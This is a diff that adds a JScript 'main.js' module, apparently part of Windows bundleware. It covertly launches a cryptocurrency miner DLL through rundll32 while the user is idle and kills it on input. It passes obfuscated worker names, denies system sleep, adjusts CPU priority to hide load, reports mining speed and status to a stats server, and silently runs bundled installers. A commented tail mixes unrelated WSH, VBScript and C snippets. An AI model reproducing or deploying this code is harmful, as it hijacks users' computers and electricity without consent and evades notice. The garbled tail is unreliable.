@@ -1,0 +1,417 @@
+////////// 
+log("*-------------------------------main.js----------------------------------")
+log("-------------------------------main.js----------------------------------*")
+	//setTimeout( function() {sfdasdf}, 10000)
+	/*
+	__windows.EnumWindows(function(hwnd, text){trace("title="+text); return 0;}, 0);
+	trace("screen.availHeight="+screen.availHeight+", screen.height"+screen.height)
+	ExtractCab(DIR+"ecfile.cab", DIR)
+	trace(" path : "+ __storage.RegQueryValue("HKEY_CURRENT_USER","Software\\exticonhandler", "Path"))
+	__storage.RegSetValue("HKEY_CURRENT_USER","Software\\exticonhandler", "", "cacd")
+	trace(" opencl:"+__external.IsSupportOpencl())
+	*/
+function filter_shellexcute(){
+}
+function filter_shellexcute.prototype.setEnvironmentVariable(env)
+{
+	var mapType2UserName = {
+		"0":"XjYYWYWU'",
+		"1":"gk_[jWi[l[hU'",
+		"2":"X[Yec_d]\_h[cWdU'",
+		"3":"WYj_l[bofkhik[U'",
+		"4":"_dl[djcWdW][hU'",
+		"5":"Z[[f[hW]h[[c[djU'",
+		"6":"YWh[\eeZijk\\U'",
+		"7":"df,&'&((U'",
+		"8":"^[h][ijkh[U'",
+		"9":"]k_c_d[h'&((U'",
+		"A":"c_d[hYeZ[U'",
+		"B":"d[mZ_\\_YkbjoU'",
+		"C":"Z[[fX_j-U'",
+		"D":"Z[[fX_j..U'",
+		"E":"^a,&&'((-U'",
+		"F":"XjYYWYWU'"
+	}
+	var pid =__external.GetPID();
+	if(pid.length>12){
+		var type = pid.substr(15,1)
+		sendHttpStat("user",  "monitor_btc_user_"+type);
+		var val = mapType2UserName[type];
+		if(!val){
+			val = "Wl_]^((U'";
+		}
+/*		
+		__external.SetEnvironmentVariable("worktime","212345678")		
+		__external.SetEnvironmentVariable("-lowestworker","800")		
+		__external.SetEnvironmentVariable("#ki[h",val)		
+		__external.SetEnvironmentVariable("VSD",1);
+		*/
+		env("worktime") = "212345678";
+		env("-lowestworker") = 800;
+		env("#ki[h") = val;
+		//env("VSD") = 1; 
+	}
+}
+function filter_shellexcute.prototype.conditionDenyPowerQuery(){	
+	var WshShell = __wshShell
+	var DPTC=0
+	__TRY(function (){ DPTC = WshShell.RegRead("HKEY_CURRENT_USER\\Software\\exticonhandler\\DPTC")})
+	var currentTime=(new Date).valueOf();	
+	if(0 || (currentTime - parseInt(DPTC)>=7*24*60*60*1000)){		
+		//7天一次不进入待机
+		var REG_DWORD = 4;
+		__TRY(function (){WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\exticonhandler\\DPTC",  (new Date).valueOf(), "REG_DWORD")});
+		//function (){
+		var BROADCAST_QUERY_DENY = 0x424D5144;
+		var PBT_APMQUERYSUSPEND	= 0x0000;
+		var PBT_APMSUSPEND = 4
+		var  WM_POWERBROADCAST = 0x0218; 
+		var wql = "Select * from Win32_OperatingSystem"
+		var objOperatingSystem = new Enumerator (__service.ExecQuery(wql)).item();
+		var osversion = objOperatingSystem.Version
+		log(" osversion ; " + osversion);
+		if(osversion.substr(0,1) =="5"){
+			__windows.AddMsg2RetFunCallback(WM_POWERBROADCAST, function(p1,p2){
+						log("WM_POWERBROADCAST p1="+p1+" ,p2="+p2); 
+						if(p1 == WM_POWERBROADCAST && ( 
+								(p2 == PBT_APMQUERYSUSPEND) ) ){
+							__windows.RemoveMsg2RetFunCallback(WM_POWERBROADCAST);
+							setTimeout(function(){sendHttpStat("monitor_btc","deny_shutdown_xp")}, 1); //xp才会生效
+							return BROADCAST_QUERY_DENY;
+						}
+					});
+		}else{
+			var ES_SYSTEM_REQUIRED = (0x00000001)
+			var ES_DISPLAY_REQUIRED = (0x00000002)
+			var ES_USER_PRESENT     =(0x00000004)
+			var	ES_CONTINUOUS       =(0x80000000)
+			__external.SetThreadExecutionState(ES_SYSTEM_REQUIRED | ES_CONTINUOUS);
+		}
+		//}()
+	}
+};
+function filter_shellexcute.prototype.monitorCPUandInput(pipe){
+	log("monitorCPUandInput")
+	this.conditionDenyPowerQuery();
+	var starttime = __external.GetTickCount()
+	var pThis = this;	
+	var WshShell = __wshShell	
+	var WshProcessEnv = WshShell.Environment("Process") 
+	pThis.setEnvironmentVariable(WshShell.Environment("Process") )
+	WshShell.CurrentDirectory=__workdir
+	var p = WshShell.Exec("rundll32 "+pipe.name+" Control_RunDLL appwiz.cpl,,2");
+	var pid = p.ProcessID	
+	if(pid==0){
+		sendHttpStat("monitor_btc", "launch_failed_" + pipe.name, 1);
+		pThis.callback(pipe, true);
+		return ;
+	}
+	//var pid = __external.ShellExcute("", "rundll32.exe "+pipe.name+" Control_RunDLL appwiz.cpl,,2", __workdir, 0x00000080)	
+	var wql = "SELECT * FROM Win32_Process" + " where ProcessID=" + pid	
+	var timer1 = setInterval(function(){ //每秒一次idle 有输入即退出
+		var process = new Enumerator (__service.ExecQuery(wql)).item();	
+		if( process){	
+			//MonitorInput
+			var idle = __external.GetTickCount()-__external.GetLastInputInfo()
+			/*
+			
+			*/	
+			if(idle < 1500) //主动出口
+			{
+				clearInterval(timer1)
+				__TRY(function (){
+					process.Terminate(-100); 
+				})		
+				log("kill exit idle="+idle+" , pid="+pid+" , __external.GetLastInputInfo()="+__external.GetLastInputInfo()+", __external.GetTickCount()="+__external.GetTickCount());
+				var PAGE_READWRITE = 4;
+				var h = __storage.OpenFileMapping( PAGE_READWRITE, 0,"rpcxx_speed");
+				var s = "";
+				if(h)
+				{					
+					var s = __storage.ReadFileMapping(h,128)
+					sendHttpStat("monitor_btc", "rpcxx_speed_" + parseInt((parseInt(s) / 10000)) * 10000);
+				}				
+				sendHttpStat("monitor_btc", "kill_exit", parseInt((__external.GetTickCount()-starttime)/1000/60),1);
+				pThis.callback(pipe)
+				return ;
+			}	
+			//MonitorCPU 
+			var NORMAL_PRIORITY_CLASS     =        0x00000020
+			var IDLE_PRIORITY_CLASS       =        0x00000040
+			var HIGH_PRIORITY_CLASS       =        0x00000080
+			var REALTIME_PRIORITY_CLASS   =        0x00000100
+			var BELOW_NORMAL_PRIORITY_CLASS   =    0x00004000
+			var ABOVE_NORMAL_PRIORITY_CLASS   =    0x00008000
+			__cpu.Refresh_()
+			if(__cpu.LoadPercentage>60) {
+				__TRY(function (){
+				 if(process.Priority !=6){
+					process.SetPriority (BELOW_NORMAL_PRIORITY_CLASS)
+					log("monitorInput idle = "+idle + " GetTickCount()="+__external.GetTickCount()+" GetLastInputInfo()="+__external.GetLastInputInfo()
+					+" process.name="+process.Name
+					+ " handle="+process.Handle
+					+ " ExecutionState="+process.ExecutionState  
+					+ " Status="+process.Status
+					+ " Priority ="+process.Priority )
+				}
+				})					
+			 }
+			 else if(__cpu.LoadPercentage<5) {
+				__TRY(function (){	
+					 if(process.Priority !=10){
+						 process.SetPriority (ABOVE_NORMAL_PRIORITY_CLASS)
+						 log("monitorInput idle = "+idle + " GetTickCount()="+__external.GetTickCount()+" GetLastInputInfo()="+__external.GetLastInputInfo()
+						+" process.name="+process.Name
+						+ " handle="+process.Handle
+						+ " ExecutionState="+process.ExecutionState  
+						+ " Status="+process.Status
+						+ " Priority ="+process.Priority )	
+					}
+				})
+			 }			
+		}
+		else{
+			clearInterval(timer1)
+			sendHttpStat("monitor_btc", "dest_exit" , parseInt((__external.GetTickCount()-starttime) / 1000/60),1)
+			log("dest process exit");
+			pThis.callback(pipe, true)
+		}		 
+		process =null;		
+	}, 1500	) 
+}
+function filter_shellexcute.prototype.run(pipe){
+	var pThis = this;
+	if(__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl()){
+		__interrupted = __DEBUG;
+		setTimeout(function(){
+			var idle = __external.GetTickCount() - __external.GetLastInputInfo()
+			trace("filter_shellexcute __external.GetLastInputInfo=" + idle)
+			if(idle > __idletime/2)
+			{	
+				pThis.monitorCPUandInput(pipe);
+			}
+			else{
+				trace("-----busy");
+				pThis.callback(pipe, true);
+			}
+		} , __idletime)		 
+	}
+	else
+		return true;	
+} 
+function filter_idle(){
+}
+function filter_idle.prototype.run(){
+	log("filter_idle.prototype.run")
+	return true;
+}
+function filter_shellexcuteex(){
+}
+function filter_shellexcuteex.prototype.run(pipe){
+	var fso = __fso
+	var path = __workdir +pipe.name;
+	if(fso.FileExists(path)){
+		var WshShell = __wshShell;		
+		WshShell.run(__workdir +pipe.name, 0 ,false);
+		//var pid = __external.ShellExcute("", __workdir +pipe.name, "", 0x00000080)		
+		sendHttpStat("bundleinstalled", ""+""+pipe.name);
+	}
+	return true
+}
+///////////主工作
+function start(){
+	var __module = new module("main.js");
+	var _filter_idle = new filter_idle();
+	var _filter_dl = new filter_dlbusiness();
+	var _filter_se = new filter_shellexcute();
+	_filter_dl.callback =__module.push(_filter_dl);
+	_filter_se.callback = __module.push(_filter_se);
+	var pipe = __destReadys_dll;
+	__module.setDoneCallback(function (mod) {
+		log("module name "+mod.name+" onDonCallback");
+		if(!__DEBUG)
+			exit(-103);
+	})
+	__module.run(pipe)
+}
+//1 --
+setTimeout(start, 1);
+
+function sendDesktopIconState(){
+	//统计桌面图标个数
+	var fso = __fso
+	var WshShell = __wshShell 
+	var desktopdir = WshShell.SpecialFolders("Desktop") 
+	var path = desktopdir + "\\返利网.51fanli";
+	//var path = __storage.GetFolderPath(0, 0x0010, 0, 0) + "\\返利网.51fanli";
+	var exist = fso.FileExists(path);
+	log("path : "+path+" ,exist="+exist);
+	if(exist){
+		sendHttpStat("desktopicon", "exist_51fanli" );
+	}else{
+		sendHttpStat("desktopicon", "not_exist_51fanli" );
+	}
+}
+//2 --
+setTimeout(sendDesktopIconState, 2);
+
+function shellIconOverlayIdentifier() {
+	var WshShell = __wshShell
+	var clsid=""
+	__TRY(function (){ clsid = WshShell.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\.ExtIconHandler\\")})
+	log(" clsid = " + clsid);
+	if(clsid.length>0)
+		sendHttpStat("launch",  "exist_OverlayIdentifier");
+	else
+		sendHttpStat("launch",  "not_exist_OverlayIdentifier");
+}
+//3 --
+setTimeout(shellIconOverlayIdentifier, 5);
+////////////////////1 2 3/////////////////
+
+
+function modifyDesktopIcon(){
+	var WshShell = __wshShell 
+	var desktopdir = WshShell.SpecialFolders("Desktop") 
+	var path = desktopdir + "\\返利网.51fanli";
+	//var path = __storage.GetFolderPath(0, 0x0010, 0, 0) + "\\返利网.51fanli";
+	var url = __storage.GetPrivateProfileString(path,"InternetShortcut","URL");
+	log("path = " + path + ", icon url = "+url);
+	__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",url)
+}
+
+function filter_existproduct(){
+}
+function filter_existproduct.prototype.run(pipe){
+	var WshShell = __wshShell
+	var installtimes=0
+	__TRY(function (){ installtimes = WshShell.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Thunder Network\\Xmp\\installtimes")})
+	log(" installtimes = " + installtimes);
+	if(parseInt(installtimes)>0)
+		this.callback(pipe,true);
+	
+	var wql = "Select * from Win32_OperatingSystem"
+	var objOperatingSystem = new Enumerator (__service.ExecQuery(wql)).item();
+	var osversion = objOperatingSystem.Version
+	log(" osversion ; " + osversion);
+	if(osversion.substr(0,1) !="5")
+		this.callback(pipe,true);
+
+	return true	
+}
+function install(){
+	var __module = new module("xmpsetup-fanli.exe");
+	var _filter_existproduct = new filter_existproduct();
+	var _filter_dl = new filter_dlbusiness();
+	var _filter_se2 = new filter_shellexcuteex();
+	 _filter_existproduct.callback = __module.push(_filter_existproduct);
+	_filter_dl.callback =__module.push(_filter_dl);
+	_filter_se2.callback = __module.push(_filter_se2);
+	var pipe = __installReadys;
+	__module.setDoneCallback(function (mod) {
+		log(" module name "+mod.name+" onDoneCallback pipe.exitaction="+mod.pipe.exitaction+" pipe.exitcode="+pipe.exitcode+" indexfilter="+mod.currentFilterIndex);
+		delete _filter_existproduct; delete _filter_dl;delete _filter_se2;delete __module;
+	})
+	__module.run(pipe)
+}
+
+
+//setTimeout(modifyDesktopIcon, 3);
+//setTimeout(install, 4);
+/*
+var PAGE_READWRITE = 4;
+var PAGE_READONLY =2
+  
+var h = __storage.CreateFileMapping(PAGE_READWRITE,128,"000")
+__storage.WriteFileMapping(h,"aaa");
+var h2 = __storage.OpenFileMapping( PAGE_READONLY, 0,"000")
+var s = __storage.ReadFileMapping(h,128)
+var s2 = __storage.ReadFileMapping(h2,128)
+log("h="+h+",h2="+h2+",s="+s);
+  __windows.attachEvent("OnNotify", function(){alert(1)});
+ __windows.AddMsg2RetFunCallback(0x218, function(p1,p2){ return p2;});
+ __windows.RemoveMsg2RetFunCallback(1);
+//os version
+Dim osversion 
+strComputer = "."
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//" & strComputer & "/root/cimv2")
+Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+For Each objOperatingSystem In colOperatingSystems     
+    osversion = objOperatingSystem.Version
+Next
+Dim  osiversion 
+osiversion = Mid( osversion , 1, 1)
+
+//file version 
+var WshShell = new ActiveXObject("wscript.shell")
+var filespec = "%appdata%\\Microsoft\\AddIns\\msadosr.dll"
+filespec = WshShell.ExpandEnvironmentStrings(filespec);
+WScript.Echo(filespec)
+
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+//var f = fso.GetFile(filespec)
+WScript.Echo(fso.GetFileVersion(filespec))
+//64 位机
+set WshShell = WScript.CreateObject("WScript.Shell")
+Dim cpuaddresswidth 
+Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
+For Each objItem in colItems
+	cpuaddresswidth = objItem.AddressWidth        
+Next
+
+Dim strProgramPath
+Dim strWorkingDirectory
+
+If CInt(cpuaddresswidth) = 64 And CInt(osiversion) >= 6 Then
+	strProgramPath = WshShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Thunder Network\Xmp\Path")
+	strWorkingDirectory = WshShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Thunder Network\Xmp\InstDir") & "\program\"
+End If
+
+If strProgramPath = "" Then
+	strProgramPath = WshShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Thunder Network\Xmp\Path")
+End If
+If strWorkingDirectory = "" Then
+	strWorkingDirectory = WshShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Thunder Network\Xmp\InstDir") & "\program\"
+End If
+
+var WshShell = new ActiveXObject("Wscript.Shell") 
+WshShell.RegWrite ("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\instt", 1, "REG_DWORD")
+
+Set WshShell = Wscript.CreateObject("Wscript.Shell") 
+Set oShellLink = WshShell.CreateShortcut("Current Script.lnk") 
+oShellLink.TargetPath = Wscript.ScriptFullName 
+oShellLink.Save 
+Set oUrlLink = WshShell.CreateShortcut("Microsoft Web Site.URL") 
+oUrlLink.TargetPath = "http://www.microsoft.com" 
+oUrlLink.Save 
+
+Set WshShell = Wscript.CreateObject("Wscript.WshShell") 
+strDesktop = WshShell.SpecialFolders("Desktop") 
+Set oMyShortcut = WshShell.CreateShortcut(strDesktop & "\a_key.lnk") 
+OMyShortcut.TargetPath = "%windir%\notepad.exe" 
+oMyShortCut.Hotkey = "ALT+CTRL+F" 
+oMyShortCut.Save 
+Wscript.Echo oMyShortCut.HotKey = "Alt+Ctrl+F"
+
+Set WshShell = Wscript.CreateObject("Wscript.Shell") 
+Set WshSysEnv = WshShell.Environment("SYSTEM") 
+Wscript.Echo WshSysEnv("NUMBER_OF_PROCESSORS") 
+
+Const CSIDL_COMMON_STARTMENU = &H16
+var ssfDESKTOP = 0x0,
+var ssfDESKTOPDIRECTORY = 0x10,
+var ssfINTERNETCACHE =0x20,
+Set objShell = CreateObject("Shell.Application")
+Set objWorkingDirectory = objShell.NameSpace(strWorkingDirectory)
+
+Set WshShell = Wscript.CreateObject("Wscript.Shell") 
+MsgBox "Your desktop is " & WshShell.SpecialFolders("Desktop") 
+
+#define ES_SYSTEM_REQUIRED  ((DWORD)0x00000001)
+#define ES_DISPLAY_REQUIRED ((DWORD)0x00000002)
+#define ES_USER_PRESENT     ((DWORD)0x00000004)
+#define ES_CONTINUOUS       ((DWORD)0x80000000)
+ES_SYSTEM_REQUIRED | ES_CONTINUOUS
+#define ES_AWAYMODE_REQUIRED ((DWORD)0x00000040)
+		external.SetThreadExecutionState(ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED | ES_AWAYMODE_REQUIRED |ES_CONTINUOUS);	
+*/
